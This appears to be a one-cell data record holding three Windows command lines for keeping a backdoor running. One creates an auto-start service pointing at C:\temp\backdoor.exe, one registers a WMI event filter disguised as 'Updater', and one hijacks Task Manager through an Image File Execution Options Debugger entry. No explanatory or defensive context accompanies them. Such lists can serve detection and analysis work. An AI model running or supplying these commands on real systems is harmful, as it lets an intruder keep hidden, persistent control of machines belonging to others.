column1: sc create BackdoorService binPath= "C:\temp\backdoor.exe" start= auto

wmic /Namespace:(root\Subscription) PATH __EventFilter CREATE Name="Updater", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 320"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "C:\temp\backdoor.exe" /f
